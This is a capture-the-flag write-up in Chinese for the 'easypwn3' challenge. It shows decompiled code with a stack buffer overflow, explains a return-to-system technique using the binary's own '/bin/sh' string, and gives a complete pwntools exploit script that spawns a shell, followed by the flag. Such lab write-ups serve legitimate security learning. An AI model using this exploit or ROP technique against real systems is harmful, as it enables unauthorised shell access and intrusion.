# easypwn3
```
nc seclabs.cn 5118

急需pwn哥哥，白给分数了，现在开始学也能做得出来的，加油
```
[pwn3](attachment/pwn3)
## WriteUp
真正意义上开始接触pwn的一题(私以为)
ida打开F5
```c
void __cdecl main()
{
  char buf; // [rsp+0h] [rbp-20h]

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("# hack me #");
  system("date");
  printf("root@vm >", 0LL);
  read(0, &buf, 0x100uLL);
}
```

能看到存在一个很明显的栈溢出，可用空间也很大，但没有直接getshell的函数，但发现程序本身有使用system函数，并且如果你有搜索一下的话会发现程序里面还有"/bin/sh"字符串\
`.data:0000000000601060 sh              db '/bin/sh',0`\
那么就很明显了，通过劫持程序执行system函数，并控制传递的参数为"/bin/sh"，而这种方法我们成为ret2libc（中最简单的一种）


### EXP
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn3')
elf = ELF('./pwn3')

pop_ret = 0x400793
sh = 0x601060
system = 0x400570
payload = 'a'*0x28+p64(pop_ret)+p64(sh)+p64(system)
n.recvuntil('root@vm >')
n.sendline(payload)

n.interactive()
```


## flag

`flag{e14d1d7e-f595-11e9-9d8f-000c29ad2ad8}`
